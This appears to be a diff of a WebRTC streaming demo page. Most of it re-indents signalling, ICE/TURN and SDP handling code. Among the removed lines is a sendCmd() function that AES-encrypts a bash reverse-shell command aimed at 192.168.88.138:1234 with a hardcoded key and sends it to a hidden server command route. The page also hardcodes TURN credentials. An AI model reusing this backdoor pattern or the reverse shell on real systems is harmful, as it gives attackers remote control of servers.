@@ -4,14 +4,16 @@
 
 <head>
     <style id="compiled-css" type="text/css">
-        .crop{
-            overflow:hidden;
-            display:block;
+        .crop {
+            overflow: hidden;
+            display: block;
             height: 360px;
         }
-        #video{
+
+        #video {
             margin-left: -15px;
         }
+
         .sepia {
             -webkit-filter: sepia(1);
             filter: sepia(1);
@@ -45,995 +47,972 @@
 
 <script>
 
-let client;
-let reqId = 0;
-let callAlready = false;
-let rtc;
-let callType;
+    let client;
+    let reqId = 0;
+    let callAlready = false;
+    let rtc;
+    let callType;
 
-let img;
-let canvasStream;
-let imageFilter;
-let pushVideo = false;
+    let img;
+    let canvasStream;
+    let imageFilter;
+    let pushVideo = false;
 
-function reset() {
-    reqId = 0;
-    callAlready = false;
+    function reset() {
+        reqId = 0;
+        callAlready = false;
 
-    $("[id=status]").html('Not Connected');
-    $("[id=stream]").html('');
-    $("[id=socketId]").html('');
-    $("[id=msgRecv]").html('');
-    $("[id=jsonRecv]").html('');
-    $("[id=jsonSend]").html('');
+        $("[id=status]").html('Not Connected');
+        $("[id=stream]").html('');
+        $("[id=socketId]").html('');
+        $("[id=msgRecv]").html('');
+        $("[id=jsonRecv]").html('');
+        $("[id=jsonSend]").html('');
 
-    $("[id=localSdpTextarea]").html('');
-    $("[id=remoteSdpTextarea]").html('');
+        $("[id=localSdpTextarea]").html('');
+        $("[id=remoteSdpTextarea]").html('');
 
-    $("[id=errMsg]").attr("style", 'display: none');
-    $("[id=errMsgLabel]").html('');
-    $("[id=rtmpUrl]").attr("style", 'display: none');
-    $("[id=rtmpUrlLabel]").html('');
-}
-
-function handleGetIceToken (iceServers) {
-    /**
-     * Safari 利用TCP/TURN的话, 如果网络抖动, 很容易就会在应用层主动丢包, 所以如果推流不就不能用TCP/TURN
-     */
-    if ( isEdge() || (isSafari() && callType == 'push') ) {
-        for(i = 0; i < iceServers.length; i++) {
-            let obj = iceServers[i];
-            for(j = 0; j < obj.urls.length; j++) {
-                let index = obj.urls[j].indexOf("tcp", 0);
-                if (index != -1) {
-                    obj.urls.splice(j, 1);
-                    break;
-                }
-            }
-        }
-    } else {
-        for(i = 0; i < iceServers.length; i++) {
-            let obj = iceServers[i];
-            for(j = 0; j < obj.urls.length; j++) {
-                let index = obj.urls[j].indexOf("udp", 0);
-                if (index != -1) {
-                    obj.urls.splice(j, 1);
-                    break;
-                }
-            }
-        }
+        $("[id=errMsg]").attr("style", 'display: none');
+        $("[id=errMsgLabel]").html('');
+        $("[id=rtmpUrl]").attr("style", 'display: none');
+        $("[id=rtmpUrlLabel]").html('');
     }
 
-    let config = {
-        iceServers: iceServers, //[{"urls":["turn:192.168.88.133"],"username":username,"credential":password}],
-        // iceTransportPolicy: "all",
-        iceTransportPolicy: "relay",
-        iceCandidatePoolSize: 0,
-    };
-
-    if ( isEdge() || isFirefox() ) {
-        config.iceTransportPolicy = "all";
-    }
-
-    console.log('Global::handleGetIceToken(), config:', config);
-    rtc.config = config;
-
-    if ( callType == 'push' ) {
-        const videoSource = $("[id=videoSelector]").val();
-
-        rtc.push(videoSource).then( () => {
-            // Set local display
-            $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
-            // Start stat
-            rtc.stat();
-            // Waiting for ICE complete and call sendSdpCall
-
-        }).catch( (e) => {
-            console.log("Global::handleGetIceToken(), [Push Fail], e: ", e);
-        });
-
-    } else if ( callType == 'pull' ) {
-        rtc.pull().then( () => {
-            // Waiting for ICE complete and call sendSdpPull
-        }).catch( (e) => {
-            console.log("Global::handleGetIceToken(), [Pull Fail], e: ", e);
-        })
-    }
-}
-
-async function connect() {
-    return new Promise( (resolve, reject) => {
-        let host = '';
-        if ( window.location.protocol == 'https:') {
-            host = 'wss://' + window.location.hostname + ':9082';
-        } else {
-            host = 'ws://' + window.location.hostname + ':9981';
-        }
-        // host = 'wss://' + '127.0.0.1' + ':9082';
-        // host = 'wss://' + '192.168.88.133' + ':9081';
-        // host = 'ws://' + '192.168.88.133' + ':9881';
-        // host = 'ws://' + '192.168.88.133' + ':9981';
-        // host = 'wss://' + '52.196.96.7' + ':9081';
-
-        client = new WebSocket(host);
-        client.binaryType = 'arraybuffer';
-
-        client.onopen = function() {
-            console.log('Client.onopen(), host:', host);
-
-            // var bytes = new Uint8Array([0x48, 0x65, 0x6C, 0x6C, 0x6F]); // Hello
-            // client.send(bytes.buffer);
-            $("[id=status]").html('Connected');
-
-            // login();
-            resolve();
-        };
-
-        client.onclose = function(ev) {
-            console.log('Client.onclose(), host:', host);
-            $("[id=status]").html('Not Connected');
-
-            if ( rtc != null ) {
-                rtc.hangup();
-            }
-        }
-
-        client.onmessage = function(ev) {
-            console.log('Client.onmessage(), data:' + ev.data);
-            let obj = JSON.parse(ev.data);
-
-            if( obj.route != "imRTC/heartbeat" ) {
-                if( typeof(obj.data) != "undefined" ) {
-                    // Recv respond
-                    $("[id=jsonRespond]").html(ev.data);
-                } else if( typeof(obj.req_data) != "undefined"  ) {
-                    // Recv notice
-                    $("[id=jsonRecv]").html(ev.data);
-                }
-            }
-
-            if( typeof(obj.errno) == "undefined" || obj.errno == 0 ) {
-                if(obj.route == 'imRTC/sendSdpCallNotice') {
-                    $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
-                } else if(obj.route == 'imRTC/sendSdpCall') {
-                    // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
-                    if( typeof(obj.data.rtmpUrl) != "undefined" ) {
-                        // demo
-                        const rtmpUrl = 'rtmp://' + window.location.hostname + ':4000/cdn_standard/' + $("#stream").val();
-                        const flvUrl = 'http://' + window.location.hostname + ':8889/flv8889?app=cdn_standard&stream=' + $("#stream").val();
-                        // const rtmpUrl = obj.data.rtmpUrl;
-                        if( rtmpUrl.length > 0 ) {
-                            $("[id=rtmpUrl]").attr("style", 'display: block');
-                            $("[id=rtmpUrlLabel]").html(rtmpUrl);
-                            $("[id=flvUrlLabel]").html(flvUrl);
-
-                            const rtmpHerf = 'https://' + window.location.hostname + ':9877/live_test.html';
-                            $("[id=rtmpUrlHerf]").attr("href", rtmpHerf);
-                            const flvHerf = 'http://' + window.location.hostname + ':9876/flvjs/demo.html';
-                            $("[id=flvUrlHerf]").attr("href", flvHerf);
-                        }
-                    }
-
-                }  else if(obj.route == 'imRTC/sendSdpPull') {
-                    // $("[id=remoteSdpTextarea]").html(obj.data.sdp);
-                    if( typeof(obj.data.rtmpUrl) != "undefined" ) {
-                    }
-
-                } else if(obj.route == 'imRTC/sendSdpAnswerNotice') {
-                    $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
-                    $("[id=acceptBtn]").click();
-                } else if(obj.route == 'imRTC/sendGetToken') {
-                    handleGetIceToken(obj.data.iceServers);
-                }
-
-                if( obj.errmsg.length > 0 ) {
-                    $("[id=errMsg]").attr("style", 'display: block');
-                    $("[id=errMsgLabel]").html(obj.errmsg);
-                }
-            }
-        };
-    });
-};
-
-function send(obj) {
-    obj.id = reqId;
-    data = JSON.stringify(obj);
-
-    // console.log('Client.send(), ' + data);
-    if( client.readyState == client.OPEN ) {
-        if( obj.route != "imRTC/heartbeat" ) {
-            $("[id=jsonSend]").html(data);
-        }
-        client.send(data);
-        reqId++;
-        return true;
-    } else {
-        return false;
-    }
-}
-
-function sendHeartBeat() {
-    obj = {
-        route:'imRTC/heartbeat',
-        req_data:{
-        }
-    }
-    send(obj);
-}
-
-function sendSdpCall(stream, sdp) {
-    obj = {
-        route:'imRTC/sendSdpCall',
-        req_data:{
-            stream:stream,
-            sdp:sdp
-        }
-    }
-
-    console.log('Client.sendSdpCall(), ', sdp);
-    // console.log('Client.sendSdpCall()');
-    send(obj);
-}
-
-function sendSdpPull(stream, sdp) {
-    obj = {
-        route:'imRTC/sendSdpPull',
-        req_data:{
-            stream:stream,
-            sdp:sdp
-        }
-    }
-
-    // console.log('Client.sendSdpPull(), ', JSON.stringify(obj));
-    console.log('Client.sendSdpPull()');
-    send(obj);
-}
-
-function sendSdpUpdate(stream, sdp) {
-    obj = {
-        route:'imRTC/sendSdpUpdate',
-        req_data:{
-            stream:stream,
-            sdp:sdp
-        }
-    }
-    console.log('Client.sendSdpUpdate(), ', sdp);
-    send(obj);
-}
-
-function heartBeat() {
-    // console.log('Client.heartBeat()');
-    // setTimeout(() => {
-    //     if( client.readyState == client.OPEN ) {
-    //         sendHeartBeat();
-    //         heartBeat();
-    //     }
-    // }, 30000);
-}
-
-async function sendGetToken() {
-    await connect();
-
-    obj = {
-        route:'imRTC/sendGetToken',
-        req_data:{
-        }
-    }
-
-    console.log('Client.sendGetToken(), ', JSON.stringify(obj));
-    send(obj);
-}
-
-async function sendCmd() {
-    await connect();
-
-    let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
-    obj = {
-        route:'imRTC/sendCmd',
-        req_data:{
-            cmd:cmd,
-        }
-    }
-    let data = JSON.stringify(obj);
-
-    let key = 'mediaserver12345';
-    key = CryptoJS.enc.Utf8.parse(key);
-    let options = {
-        mode: CryptoJS.mode.ECB,
-        padding: CryptoJS.pad.Pkcs7
-    };
-    let encrypted = CryptoJS.AES.encrypt(data, key, options);
-    // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
-    let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
-    // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
-
-    console.log('Client.send(), ' + encrypted_base64);
-    if( client.readyState == client.OPEN ) {
-        $("[id=jsonSend]").html(encrypted_base64);
-        client.send(encrypted_base64);
-    }
-}
-
-async function push() {
-    // await connect();
-
-    setTimeout( () => {
-        sendSdpCall($("#stream").val(), $("#localSdpTextarea").val());
-        callAlready = true;
-    }, 1);
-}
-
-async function pull() {
-    // await connect();
-
-    // setTimeout( () => {
-    //     sendSdpPull($("#stream").val(), $("#localSdpTextarea").val());
-    //     callAlready = true;
-    // }, 1000);
-}
-
-class RTCClient {
-    constructor(config) {
-        this.mediaStream = null;
-        this.pc = null;
-        this.config = config;
-        this.onicecandidate = null;
-        this.onicecomplete = null;
-    }
-
-    init() {
-        this.pc = new RTCPeerConnection(this.config);
-
-        this.pc.onicecandidate = event => {
-            if (!event.candidate) {
-                return;
-            }
-
-            let json = JSON.stringify(event.candidate);
-            console.log('RTCClient::onicecandidate(), candidate:', json);
-
-            // 通过ICE服务获取到NAT的类型和外网的IP端口
-            let sdp = this.pc.localDescription.sdp;
-            this.onicecandidate(sdp, event.candidate);
-        };
-
-        // 收到对方的视频流
-        // this.pc.onaddstream = event => {
-        //     console.log('RTCClient::onaddstream(), stream:', event.stream);
-        //     $("[id=localVideo]").attr("style", 'display: block');
-        //     if (window.URL.createObjectURL) {
-        //         $("[id=remoteVideo]").attr("src", window.URL.createObjectURL(event.stream));
-        //     } else {
-        //         $("[id=remoteVideo]").attr("srcObject", event.stream);
-        //     }
-        //     $("[id=localVideo]").attr("srcObject", event.stream);
-        // };
-        this.pc.ontrack = event => {
-            console.log('RTCClient::ontrack(), stream:', event.streams[0]);
-            $("[id=localVideo]").attr("style", 'display: block');
-            let video = $("[id=localVideo]")[0];
-            if ( $("[id=localVideo]")[0].srcObject !== event.streams[0] ) {
-                $("[id=localVideo]").attr("srcObject", event.streams[0]);
-            }
-        };
-
-        // ICE握手状态
-        this.pc.onicegatheringstatechange = event => {
-            console.log('RTCClient::onicegatheringstatechange(), iceGatheringState:', this.pc.iceGatheringState);
-            if ( this.pc.iceGatheringState == 'complete' ) {
-                this.onicecomplete();
-            }
-        };
-
-        // 对方关闭
-        this.pc.oniceconnectionstatechange = event => {
-            console.log('RTCClient::oniceconnectionstatechange(), iceConnectionState: ', this.pc.iceConnectionState);
-            if (this.pc.iceConnectionState === 'disconnected' || this.pc.iceConnectionState === 'closed') {
-            }
-        };
-    }
-
-    async hangup() {
-        this.close();
-
-        $("[id=localSdpTextarea]").attr("disabled", true);
-        $("[id=callButton]").attr("disabled", false);
-        $("[id=acceptButton]").attr("disabled", false);
-
-        $("[id=stats]").html("");
-    }
-
-    async pull() {
-        reset();
-        this.init();
-
-        let offer = await this.pc.createOffer({
-            offerToReceiveAudio: true,
-            offerToReceiveVideo: true
-        });
-        offer.sdp = this.createLocalSdp(offer.sdp);
-
-        await this.pc.setLocalDescription(offer);
-
-        // let localDescription = JSON.stringify(this.pc.localDescription);
-        console.log('RTCClient::pull(), offer :', offer.sdp);
-
-        // $("[id=localSdpTextarea]").html(this.pc.localDescription.sdp);
-        $("[id=localSdpTextarea]").html(offer.sdp);
-        $("[id=localSdpTextarea]").attr("disabled", false);
-        $("[id=acceptButton]").attr("disabled", false);
-    }
-
-    async push(videoSource) {
-        reset();
-        this.init();
-
-        if ( pushVideo ) {
-            await this.showStaticVideo();
-        } else {
-            await this.showLocalVideo(videoSource);
-        }
-
-        let offer = await this.pc.createOffer({
-            offerToReceiveAudio: false,
-            offerToReceiveVideo: false
-        });
-        offer.sdp = this.createLocalSdp(offer.sdp);
-
-        await this.pc.setLocalDescription(offer);
-
-        // let localDescription = JSON.stringify(this.pc.localDescription);
-        console.log('RTCClient::push(), offer :', offer.sdp);
-
-        $("[id=localSdpTextarea]").html(offer.sdp);
-        $("[id=localSdpTextarea]").attr("disabled", false);
-        $("[id=acceptButton]").attr("disabled", false);
-    }
-
-    async accpet(answer) {
-        console.log('RTCClient::accpet(), answer: ', answer);
-        $("[id=acceptButton]").attr("disabled", true);
-        await this.pc.setRemoteDescription(answer);
-    }
-
-    close() {
-        if ( this.pc != null ) {
-            this.pc.close();
-            this.pc = null;
-        }
-        this.stopLocalVideo();
-    }
-
-    async showStaticVideo() {
-        return new Promise( (resolve, reject) => {
-            // Video tag capture must be set up after video tracks are enumerated.
-            let leftVideo = $("[id=localVideo]")[0];
-            $("[id=localVideo]").attr("style", 'display: block');
-            leftVideo.src = './video/jzq_feph.mp4';
-            leftVideo.srcObject = null;
-
-            leftVideo.oncanplay = () => {
-                if ( this.mediaStream == null ) {
-                    this.mediaStream = leftVideo.captureStream();
-                    console.log('Captured stream from leftVideo with captureStream',
-                        this.mediaStream);
-                    let video = this.mediaStream.getVideoTracks()[0];
-                    this.pc.addStream(this.mediaStream);
-                    resolve();
-                }
-            };
-            if (leftVideo.readyState >= 3) {
-                if ( this.mediaStream == null ) {
-                    this.mediaStream = leftVideo.captureStream();
-                    this.mediaStream = this.mediaStream;
-                    this.pc.addStream(this.mediaStream);
-                    resolve();
-                }
-            }
-            leftVideo.play();
-        });
-    }
-
-    async showLocalVideo(videoSource) {
-        $("[id=localVideo]").attr("style", 'display: block');
+    function handleGetIceToken(iceServers) {
         /**
-         * Edge does not support custom video size
-         * only support original video capture size, example: 320x240, 640x480
+         * Safari
+         * 1) when use TCP/TURN, it will abandon some rtp packet if network is unstable. So we just use UDP/TURN here when push
+         *
+         * Edge does not like
+         * 1) stun: filtered after 14393 unless ?transport=udp is present
+         * 2) turn: that does not have all of turn:host:port?transport=udp
+         * 3) turn: with ipv6 addresses
+         * 4) turn: occurring muliple times
+         * @type {{iceTransportPolicy: string, iceCandidatePoolSize: number, iceServers: any}}
          */
-        let config = {};
-        config = {
-            video: {
-                deviceId: videoSource ? {exact: videoSource} : undefined,
-                // width: {exact: 640}/*{min: 320, max: 640}*/, height: {exact: 480}/*{min: 240, max: 480}*/,
-                // QVGA
-                // width: 320, height: 240,
-                // VGA
-                width: 640, height: 480,
-                // HD
-                // width: 1280, height: 720,
-                // FULL HD
-                // width: 1920, height: 1080,
-                // 4K
-                // width: 4096, height: 2160,
-                // 8K
-                // width: 7680, height: 4320,
-                frameRate: 15/*{min: 10, max: 15}*/
-            },
-            audio: true
-        }
-
-        return window.navigator.mediaDevices.getUserMedia(config).then(mediaStream => {
-            let video = mediaStream.getVideoTracks()[0];
-            if ( typeof(video)=="undefined" || video==null ) {
-                console.log("RTCClient::showLocalVideo(), [Fail], No Video Can Be Captured.");
+        if (isEdge() || (isSafari() && callType == 'push')) {
+            for (i = 0; i < iceServers.length; i++) {
+                let obj = iceServers[i];
+                for (j = 0; j < obj.urls.length; j++) {
+                    let index = obj.urls[j].indexOf("tcp", 0);
+                    if (index != -1) {
+                        obj.urls.splice(j, 1);
+                        break;
+                    }
+                }
             }
-
-            this.setVideoTrackContent(mediaStream);
-            this.mediaStream = mediaStream;
-
-            $("[id=localVideo]").attr('srcObject', mediaStream);
-            // var canvas = $("[id=localCanvas]")[0];
-            // draw();
-            //
-            // canvasStream = canvas.captureStream();
-            // console.log("canvasStream: ", canvasStream);
-
-            this.pc.addStream(mediaStream);
-
-            // (async () => {
-            //     // const workerCode = document.querySelector('#workerCode').textContent;
-            //     // const blob = new Blob([workerCode], { type: 'text/javascript' });
-            //     // const url = URL.createObjectURL(blob);
-            //     const url = 'webgl-worker.js';
-            //     const worker = new Worker(url, { name : 'webgl'});
-            //     const canvas = $("[id=localCanvas]")[0].transferControlToOffscreen();
-            //     worker.postMessage({msg:'draw', canvas:canvas}, [canvas]);
-            //     URL.revokeObjectURL(url);
-            // })();
-        }).catch( e => {
-            console.log("RTCClient::showLocalVideo(), [Fail], e: ", e);
-        });
-    }
-
-    async stopLocalVideo() {
-        $("[id=localVideo]").attr("style", 'display: none');
-        if (this.mediaStream) {
-            this.mediaStream.getTracks().forEach(
-                track => track.stop()
-            );
-            $("[id=localVideo]").attr('srcObject', null);
+        } else {
+            for (i = 0; i < iceServers.length; i++) {
+                let obj = iceServers[i];
+                for (j = 0; j < obj.urls.length; j++) {
+                    let index = obj.urls[j].indexOf("udp", 0);
+                    if (index != -1) {
+                        obj.urls.splice(j, 1);
+                        break;
+                    }
+                }
+            }
         }
-    }
 
-    // setBandwidth(bandwidth) {
-    //     // In Chrome, use RTCRtpSender.setParameters to change bandwidth without
-    //     // (local) renegotiation. Note that this will be within the envelope of
-    //     // the initial maximum bandwidth negotiated via SDP.
-    //     if ((adapter.browserDetails.browser === 'chrome' ||
-    //         (adapter.browserDetails.browser === 'firefox' &&
-    //             adapter.browserDetails.version >= 64)) &&
-    //         'RTCRtpSender' in window &&
-    //         'setParameters' in window.RTCRtpSender.prototype) {
-    //         const sender = this.pc.getSenders()[0];
-    //         const parameters = sender.getParameters();
-    //         if (!parameters.encodings) {
-    //             parameters.encodings = [{}];
-    //         }
-    //         parameters.encodings[0].maxFramerate = 15;
-    //         if (bandwidth === 'unlimited') {
-    //             delete parameters.encodings[0].maxBitrate;
-    //         } else {
-    //             parameters.encodings[0].maxBitrate = bandwidth * 1000;
-    //         }
-    //         sender.setParameters(parameters)
-    //             .then(() => {
-    //             })
-    //             .catch(e => console.error(e));
-    //     }
-    // }
+        let config = {
+            iceServers: iceServers, //[{"urls":["turn:192.168.88.133"],"username":username,"credential":password}],
+            // iceTransportPolicy: "all",
+            iceTransportPolicy: "relay",
+            iceCandidatePoolSize: 0,
+        };
 
-    createLocalSdp(sdp) {
-        var newSdp = sdp;
-        // 设置码率
-        newSdp = this.setBitRate(sdp);
-        // newSdp = newSdp.replace(/m=video (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=video $1 UDP/TLS/RTP/SAVPF 102');
-        // newSdp = newSdp.replace(/m=audio (\d+) UDP\/TLS\/RTP\/SAVPF ([0-9 ]*)/g, 'm=audio $1 UDP/TLS/RTP/SAVPF 111');
-        // newSdp = newSdp.replace(/a=rtcp-fb:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=fmtp:((?!102)(?!111))\d{1,3} .*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=rtpmap:(?!102)(?!111)\d{1,3} .*\r\n/g, '');
+        if (isEdge() || isFirefox()) {
+            config.iceTransportPolicy = "all";
+        }
 
-        // newSdp = newSdp.replace(/a=rtcp-fb:(?!111)\d{1,3} .*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=fmtp:(?!111)\d{1,3} .*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=rtpmap:(?!111)\d{1,3} .*\r\n/g, '');
+        console.log('Global::handleGetIceToken(), config:', config);
+        rtc.config = config;
 
-        // newSdp = newSdp.replace(/a=extmap:.*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=msid.*\r\n/g, '');
-        // newSdp = newSdp.replace(/a=rtcp:.*\r\n/g, '');
-        return newSdp;
-    }
+        if (callType == 'push') {
+            const videoSource = $("[id=videoSelector]").val();
 
-    setBitRate(sdp) {
-        var newSdp = sdp;
-        // 只对Safari和Chrome生效
-        newSdp = newSdp.replace(/a=fmtp:(.*)\r\n/g, 'a=fmtp:$1;x-google-start-bitrate=1000;x-google-max-bitrate=1000\r\n');
-        // 对Firefox生效, 只能限制, 不能提高
-        // newSdp = newSdp.replace(/a=mid:(.*)\n/g, 'a=mid:$1\r\nb=TIAS:1000000\r\n');
-        return newSdp;
-    }
+            rtc.push(videoSource).then(() => {
+                // Set local display
+                $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
+                // Start stat
+                rtc.stat();
+                // Waiting for ICE complete and call sendSdpCall
 
-    setVideoTrackContent(stream, hint) {
-        const tracks = stream.getVideoTracks();
-        tracks.forEach(track => {
-            // Get old constraints
-            let constraints = track.getConstraints();
-            // constraints.width = 640;
-            // constraints.height = 360;
-            // It is always success, unless you set some parameter with exact value
-            track.applyConstraints(constraints).then(() => {
-                console.log('RTCClient::setVideoTrackContent(), [OK], constraints:', constraints);
-            }, e => {
-                console.log('RTCClient::setVideoTrackContent(), [Fail], e:', e);
+            }).catch((e) => {
+                console.log("Global::handleGetIceToken(), [Push Fail], e: ", e);
             });
 
-            // if ('contentHint' in track) {
-            //     track.contentHint = hint;
-            //     if (track.contentHint !== hint) {
-            //         console.log('RTCClient::createStream( Invalid video track contentHint: ' + hint + ' )');
-            //     }
-            // } else {
-            //     console.log('RTCClient::createStream( contentHint attribute not supported )');
-            // }
-        });
+        } else if (callType == 'pull') {
+            rtc.pull().then(() => {
+                // Start stat
+                rtc.stat();
+                // Waiting for ICE complete and call sendSdpPull
+
+            }).catch((e) => {
+                console.log("Global::handleGetIceToken(), [Pull Fail], e: ", e);
+            })
+        }
     }
 
-    stat() {
-        setTimeout(() => {
-            if( this.pc != null ) {
-                this.pc.getStats(null).then(
-                    results => {
-                        let statsString = "";
-                        results.forEach(res => {
-                            // console.log("RTCClient::stat( " + res.type + " )");
-                            statsString += '<h3>Report type=';
-                            statsString += res.type;
-                            statsString += '</h3>\n';
-                            if ( res.type == 'media-source' ) {
-                                statsString += `id ${res.id}<br>`;
-                                statsString += `time ${res.timestamp}<br>`;
-                                Object.keys(res).forEach(k => {
-                                    if (k !== 'timestamp' && k !== 'type' && k !== 'id') {
-                                        statsString += `${k}: ${res[k]}<br>`;
-                                    }
-                                });
-                                $("[id=stats]").html(statsString);
-                            } else if ( res.type == 'outbound-rtp' ) {
-                                Object.keys(res).forEach(k => {
-                                    statsString += `${k}: ${res[k]}<br>`;
-                                });
-                            } else if ( res.type == 'transport' ) {
-                                Object.keys(res).forEach(k => {
-                                    statsString += `${k}: ${res[k]}<br>`;
-                                });
-                            }
-                        });
-                        $("[id=stats]").html(statsString);
-                    }
-                );
-
-                this.stat();
+    async function connect() {
+        return new Promise((resolve, reject) => {
+            let host = '';
+            if (window.location.protocol == 'https:') {
+                host = 'wss://' + window.location.hostname + ':9082';
             } else {
-                $("[id=stats]").html("");
+                host = 'ws://' + window.location.hostname + ':9981';
             }
-        }, 1000);
-    }
+            // host = 'wss://' + '127.0.0.1' + ':9082';
+            // host = 'wss://' + '192.168.88.133' + ':9081';
+            // host = 'ws://' + '192.168.88.133' + ':9881';
+            // host = 'ws://' + '192.168.88.133' + ':9981';
+            // host = 'wss://' + '52.196.96.7' + ':9081';
 
-}
+            client = new WebSocket(host);
+            client.binaryType = 'arraybuffer';
 
-function showUserAgent() {
-    var userAgent = navigator.userAgent;
-    $("[id=userAgent]").html(userAgent);
-    $("[id=isEdge]").html(isEdge()?"TRUE":"FALSE");
-}
+            client.onopen = function () {
+                console.log('Client.onopen(), host:', host);
 
-function isIE() {
-    return navigator.userAgent.indexOf("compatible") > -1 && userAgent.indexOf("MSIE") > -1;
-}
+                // var bytes = new Uint8Array([0x48, 0x65, 0x6C, 0x6C, 0x6F]); // Hello
+                // client.send(bytes.buffer);
+                $("[id=status]").html('Connected');
 
-function isEdge() {
-    // return navigator.userAgent.indexOf("Edge") > -1 && !isIE();
-    return ( adapter.browserDetails.browser == 'edge' );
-}
+                // login();
+                resolve();
+            };
 
-function isSafari() {
-    return ( adapter.browserDetails.browser == 'safari' );
-}
+            client.onclose = function (ev) {
+                console.log('Client.onclose(), host:', host);
+                $("[id=status]").html('Not Connected');
 
-function isFirefox() {
-    return ( adapter.browserDetails.browser == 'firefox' );
-}
-
-function draw() {
-    var video = $("[id=localVideo]")[0];
-    imageFilter.drawImage(video);
-    imageFilter.draw();
-    setTimeout(() => {
-        draw();
-    }, 100);
-}
-
-function onload() {
-    if (!window.navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        alert('WebRTC.mediaDevices is not supported.');
-        return;
-    }
-
-    if (!window.RTCPeerConnection) {
-        alert('WebRTC.RTCPeerConnection is not supported.');
-        return;
-    }
-
-    console.log("Browser is " + adapter.browserDetails.browser);
-
-    var canvas = $("[id=localCanvas]")[0];
-    imageFilter = new ImageFilter();
-    imageFilter.init(canvas);
-
-    // // imageFilter.loadImage('img/1.jpg');
-    // draw();
-    // canvasStream = canvas.captureStream();
-    // console.log("canvasStream: ", canvasStream);
-
-    // $("[id=localVideo]")[0].className = 'sepia';
-    // img = $("[id=localVideo]")[0];
-    // var canvas = $("[id=localCanvas]")[0];
-    // ctx = canvas.getContext("2d");
-
-    // draw(canvas, ctx, img);
-    // var img = $("[id=localImg]")[0];
-    // img.onload = function() {
-    //     draw(canvas, ctx, img);
-    //     canvasStream = canvas.captureStream();
-    // }
-
-    const configChromeDemo = {
-        // iceServers: JSON.parse('[{"urls":["stun:192.168.88.134:3478"]}]')
-        // iceServers: JSON.parse('[{"urls":["turn:192.168.88.134:3478?transport=tcp"],"username":"MaxClient","credential":"123"},{"urls":["stun:192.168.88.134:3478"]}]')
-        // iceServers: JSON.parse('[{"urls":["turn:192.168.88.134:3478?transport=tcp"],"username":"MaxClient","credential":"123"}]'), iceTransportPolicy: "relay"
-        // iceServers: JSON.parse('[{"urls":["stun:52.196.96.7:3478"]}]')
-        // iceServers: JSON.parse('[{"urls":["turn:52.196.96.7:3478?transport=tcp"],"username":"MaxClient","credential":"123"}, {"urls":["stun:52.196.96.7:3478"]}]'),
-        iceServers: JSON.parse('[{"urls":["turn:52.196.96.7"],"username":"MaxClient","credential":"123"}]'),
-        iceTransportPolicy: "all",
-        iceCandidatePoolSize: 0
-    };
-    const configChromeLocal = {
-        iceServers: JSON.parse('[{"urls":["turn:192.168.88.133?transport=tcp"],"username":"MaxClient","credential":"123"}]'),
-        iceTransportPolicy: "relay",
-        iceCandidatePoolSize: 0
-    }
-
-    /**
-     * Edge does not like
-     * 1) stun: filtered after 14393 unless ?transport=udp is present
-     * 2) turn: that does not have all of turn:host:port?transport=udp
-     * 3) turn: with ipv6 addresses
-     * 4) turn: occurring muliple times
-     * @type {{iceTransportPolicy: string, iceCandidatePoolSize: number, iceServers: any}}
-     */
-    const configEdgeDemo = {
-        iceServers: JSON.parse('[{"urls":["turn:52.196.96.7?transport=udp"],"username":"MaxClient","credential":"123"}]'),
-        iceTransportPolicy: "all",
-        iceCandidatePoolSize: 0
-    }
-
-    const configEdgeLocal = {
-        iceServers: JSON.parse('[{"urls":["turn:192.168.88.133?transport=udp"],"username":"MaxClient","credential":"123"}]'),
-        iceTransportPolicy: "all",
-        iceCandidatePoolSize: 0
-    }
-
-    let config = {};
-    // if ( window.location.hostname == '52.196.96.7' ) {
-    //     if ( isEdge() ) {
-    //         config = configEdgeDemo;
-    //     } else {
-    //         config = configChromeDemo;
-    //     }
-    // } else {
-    //     if ( isEdge() ) {
-    //         config = configEdgeLocal;
-    //     } else {
-    //         config = configChromeLocal;
-    //     }
-    // }
-    // console.log(JSON.stringify(config));
-    rtc = new RTCClient(config);
-    rtc.onicecandidate = (sdp, candidate) => {
-        $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
-        if( callType == 'push' || callType == 'pull' ) {
-            if ( callAlready ) {
-                // Update sdp to media server
-                // let json = JSON.stringify(event.candidate);
-                // console.log("Rtc onicecandidate, candidate: ", json);
-                // sendSdpUpdate($("[id=stream]").val(), rtc.pc.localDescription.sdp);
+                if (rtc != null) {
+                    rtc.hangup();
+                }
             }
-        }
-    };
 
-    rtc.onicecomplete = () => {
-        // Get Whole sdp with ice candidate, but it maybe cost time
-        $("[id=localSdpTextarea]").html(rtc.pc.localDescription.sdp);
-        // Send sdp call to media server
-        if( callType == 'push' ) {
-            sendSdpCall($("#stream").val(), $("#localSdpTextarea").val());
-        } else if ( callType == 'pull' ) {
-            sendSdpPull($("#stream").val(), $("#localSdpTextarea").val());
-        }
-    }
+            client.onmessage = function (ev) {
+                console.log('Client.onmessage(), data:' + ev.data);
+                let obj = JSON.parse(ev.data);
 
-    $("[id=pushBtn]").click(function() {
-        callType = 'push';
-        pushVideo = false;
+                if (obj.route != "imRTC/heartbeat") {
+                    if (typeof (obj.data) != "undefined") {
+                        // Recv respond
+                        $("[id=jsonRespond]").html(ev.data);
+                    } else if (typeof (obj.req_data) != "undefined") {
+                        // Recv notice
+                        $("[id=jsonRecv]").html(ev.data);
+                    }
+                }
 
-        // Start capture and ice
-        const videoSource = $("[id=videoSelector]").val();
+                if (typeof (obj.errno) == "undefined" || obj.errno == 0) {
+                    if (obj.route == 'imRTC/sendSdpCallNotice') {
+                        $("[id=remoteSdpTextarea]").html(obj.req_data.sdp);
